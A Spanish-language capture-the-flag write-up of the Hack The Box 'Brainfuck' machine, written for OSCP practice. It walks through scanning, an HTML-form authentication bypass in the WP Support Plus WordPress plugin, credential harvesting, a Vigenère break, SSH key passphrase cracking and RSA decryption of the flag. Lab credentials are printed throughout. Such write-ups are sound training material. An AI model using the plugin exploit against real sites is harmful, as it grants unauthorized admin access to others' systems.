---
layout: post
title: Write-Up Máquina Brainfuck HTB | Preparación OSCP
date: 2021-01-30 16:00 +0800
last_modified_at: 2021-01-30 16:10 +0800
tags: [htb, writeup, linux, wordpress, smtp, vigenère, rsa]
toc:  true
---
![Brainfuck-info-card](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-info-card.png)

## Introducción
La máquina brainfuck corre un sistema linux de 64 bits y esta catalogada como insana. La explotación de esta máquina se basa en una vulnerabilidad de un plugin de wordpress con la que vamos a poder obtener acceso con el usuario admin. Una vez dentro veremos que hay un plugin instalado, con el que vamos a poder ver una contraseña para el servicio smtp. Después obtendremos acceso a un foro en el cual tendremos una parte cifrada con vigenère y gracias a tener ciertas similitudes entre el texto cifrado y en texto plano podremos sacar la clave de cifra y extraer asi una clave RSA. Para obtener el usuario, tendremos que hacer un ataque de fuerza bruta a la clave privada RSA para conectarnos por SSH al usuario. Una vez dentro, veremos varios ficheros que nos permitirán obtener la flag de root.

---
## Escaneo

nmap -p- -sV -sC 10.10.10.17 --min-rate=5000
```yml
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 14:46 CET
Nmap scan report for 10.10.10.17
Host is up (0.037s latency).
Not shown: 65530 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES USER AUTH-RESP-CODE UIDL CAPA TOP PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities IMAP4rev1 listed OK have more LITERAL+ ID SASL-IR ENABLE IDLE Pre-login post-login LOGIN-REFERRALS AUTH=PLAINA0001
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.25 seconds
```
La máquina tiene 5 puertos abiertos:
* 22: SSH
* 25: SMTP (Postfix SMPTd)
* 110: POP3 (Dovecot POP3d)
* 143: IMAP (Dovecot IMAPd)
* 443: HTTP (nginx 1.10.0)

### Puerto 22
En el puerto 22, nos encontramos un servidor SSH, el cual ahora no nos es útil, pero luego lo utilizaremos para conectarnos con la máquina.

### Puerto 25, 110, 143
Los puertos 25, 110 y 143 corresponden con los protocolos utilizados por los servicios de correo electrónico. Igual que antes, por ahora no nos es util, pero lo utilizaremos después de la explotación.

### Puerto 443
El puerto 443 corresponde corresponde con un servidor HTTP. En este caso, el servicio corresponde con un nginx versión 1.10.0

---
## Enumeración

Viendo el escaneo de nmap, podemos deducir que en la maquina hay 1 dominio raíz y 2 subdominios:
1. Dominio raíz:
   * brainfuck.htb
2. Subdominios:
   1.  www.brainfuck.htb
   2.  sup3rs3cr3t.brainfuck.htb

Si accedemos a https://brainfuck.htb, nos encontramos con una página de wordpress en la que tenemos una direccion de correo electrónico.

![Brainfuck-email](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-email.png)

Ya que sabemos que es wordpress, vamos a analizar la plataforma con la herramienta wpscan.
* wpscan --url https://brainfuck.htb/ --disable-tls-checks

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.13
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Wed Feb  3 14:56:23 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2021-01-14T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 3.0.40
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===========================================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Feb  3 14:56:28 2021
[+] Requests Done: 56
[+] Cached Requests: 5
[+] Data Sent: 13.884 KB
[+] Data Received: 161.755 KB
[+] Memory used: 247.184 MB
[+] Elapsed time: 00:00:05
```

Vamos a enumerar los usuarios para realizar la exploitación

```s
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ```

---
## Explotación

Para la explotación, vamos a hacer uso de una vulnerabilidad en el plugin *wp support plus responsive ticket system*. En este caso, la vulnerabilidad reside en una mala gestión del componente wp_set_auth_cookie() de wordpress.
* https://packetstormsecurity.com/files/140413/wpsupportplusrts-escalate.txt

Para explotar esta vulnerablilidad primero crearemos en nuestra máquina un fichero html con el siguiente contenido:
```html
<form action="https://brainfuck.htb/wp-admin/admin-ajax.php" method="post">
  Username: <input type="text" name="username" value="admin">
  <input type="hidden" name="email" value="sth">
  <input type="hidden" name="action" value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
```

Despues, lo expondremos con un servidor web en python para realizar la petición post al servidor.
En este caso, utilizamos el user admin, ya que es el que tiene los permisos suficientes para gestonar la plataforma.

![Brainfuck-python-server](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-python-server.png)

Una vez levantado, vamos a nuestro navegador y accedemos a la al fichero. En mi caso, la url sería http://127.0.0.1:8000/test.html

![Brainfuck-test-html](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-test-html.png)

Si pulsamos login, nos redirigirá a https://brainfuck.htb/wp-admin/admin-ajax.php.

Si ahora accedemos a https://brainfuck.htb/wp-admin/, nos saltamos el login y ya estariamos logeados en wordpress como usuario admin.

![Brainfuck-wp-admin](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-wp-admin.png)

Si nos vamos a la pestaña de plugins, nos encontraremos uno llamado *Easy WP SMTP*. Si le damos a settings y bajamos un poco, veremos que tenemos un usuario y una password.

![Brainfuck-orestis-blurred-password](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-orestis-blurred-password.png)

Para ver la contraseña, nos vale con ver el codigo fuente de la pagina.

```html
 <tr class="ad_opt swpsmtp_smtp_options">
    <th>SMTP username</th>
    <td>
        <input type='text' name='swpsmtp_smtp_username' value='orestis' /><br />
        <p class="description">The username to login to your mail server</p>
    </td>
    </tr>
<tr class="ad_opt swpsmtp_smtp_options">
    <th>SMTP Password</th>
    <td>
        <input type='password' name='swpsmtp_smtp_password' value='kHGuERB29DNiNE' /><br />
        <p class="description">The password to login to your mail server</p>
    </td>
</tr>
```

Acabamos de obtener la password del user orestis para el servicio SMTP.

Si iniciamos sesión con *Claws Mail*, en el inbox veremos dos emails. Si leemos el primero Vemos unas credenciales para un foro secreto.

![Brainfuck-mail-creds](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-mail-creds.png)

* username: orestis
* password: kIEnnfEKJ#9UmdO

Este foro secreto se encuentra alojado en el subdominio **sup3rs3cr3t.brainfuck.htb**.
si accedemos y nos logueamos, vemos varios hilos.

![Brainfuck-secret-forum-threads](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-secret-forum-threads.png)

Llama la atención primero el hilo SSH Access y el hilo Key. Si abrimos el hilo SSH Access dice que ya el acceso por contraseña no se va a utilizar y nuestro user ha pedido si clave privada. El hilo Key, es un hilo cifrado con vigenère.

Si nos fijamos bien en los dos hilos hay similitudes entre los mensajes de nuestro user. Estas similitudes las podemos usar para sacar la clave con la que se ha cifrado.

* SSH Access: Orestis - Hacking for fun and profit
* Key: Pieagnm - Jkoijeg nbw zwx mle grwsnn

Si usamos el texto plano para descifrar el texto cifrado, obtendremos la clave.

![Brainfuck-uncipher-vigenere](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-uncipher-vigenere.png)

En este caso el resultado literal que nos sale es: 
* Brainfu - Ckmybra inf uck myb rainfu

Si nos fijamos bien veremos que son repeticiones de la clave.
La clave final en este caso resultaria: 
* fuckmybrain

Una vez ya sabemos la clave con la que se ha cifrado el texto,  vamos a  descifrar la url para asi poder descargar la clave privada del usuario orestis.

![Brainfuck-unciphered-url](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-unciphered-url.png)

La url quedaria de la siguiente manera:
* https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

Si accedemos, ya podremos descargar la clave privada del usuario.

Una vez descargada tendremos que hacer fuerza bruta para sacar la password y ya conectarnos por SSH a la máquina.

Para realizar este ataque, primero tenemos que pasar la clave privada a un formato compatible con la herramienta **John The Ripper**.

para esto vamos a usar una herramienta que trae John para transformar la clave privada.

```bash
/usr/share/john/ssh2john.py id_rsa > id_rsa_john
```

Una vez la tengamos transformada y en un archivo vamos a proceder a realizar el ataque de fuerza bruta.

![Brainfuck-id-rsa-cracked](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-id-rsa-cracked.png)

Con el ataque de fuerza bruta, hemos obtenido la clave para iniciar sesión por SSH con el usuario orestis.
* Password: 3poulakia!

Una vez accedamos por SSH, vemos que en la carpeta del user, tenemos ya la flag de user.

![Brainfuck-user-flag](/assets/imagenes/2021-02-03-brainfuck-HTB/Brainfuck-user-flag.png)

## Lectura de la flag de root

En esta máquina, la escalada de privilegios, no es una escalada al uso, ya que en esta máquina no vamos a obtener root. En esta máquina, tenemos que leer el contenido de output.txt que esta cifrado utilizando factorización de RSA. 

```s
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

Este script, lo que hace es leer /root/root.txt y de ahí abre para escribir output.txt y debug.txt.
Luego genera p y q siendo valores primos generados aleatoriamente. Después genera n siendo p*q y genera phi.
Por ultimo cifra la flag de root, la escribe en output.txt y escribe los valores de p, q y e en debug.txt.

Tenemos los siguientes datos:
```
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```
Y por otro lado tenemos la flag cifrada:

```
ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

Sabiendo todo esto, vamos a usar la herramienta [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) para factorizar y descifrar la flag.

```s
python3 RsaCtfTool.py -p "7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307" -q "7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079" -e "30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997" --uncipher "44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182"
private argument is not set, the private key will not be displayed, even if recovered.

Results for /tmp/tmp7uwfzewu:

Unciphered data :
HEX : 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003665666331613564626238393034373531636536353636613330356262386566
INT (big endian) : 24604052029401386049980296953784287079059245867880966944246662849341507003750
INT (little endian) : 71904489270390286963897421081584105669996639957482208029254042136896654474008309377900795222770169858295550800500193898049173843287416681363210582983968669494241908145916652778830648638955652625050463026993820664542503401605002346194560031250867811874988161020742297439368025796547799980950578223485791764480
STR : b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x006efc1a5dbb8904751ce6566a305bb8ef'
```
Ahora tenemos que pasar de hex a ascii el valor de big endian.

```bash
python -c "print format(24604052029401386049980296953784287079059245867880966944246662849341507003750, 'x').decode('hex')"
6efc1a5dbb8904751ce6566a305bb8ef
```
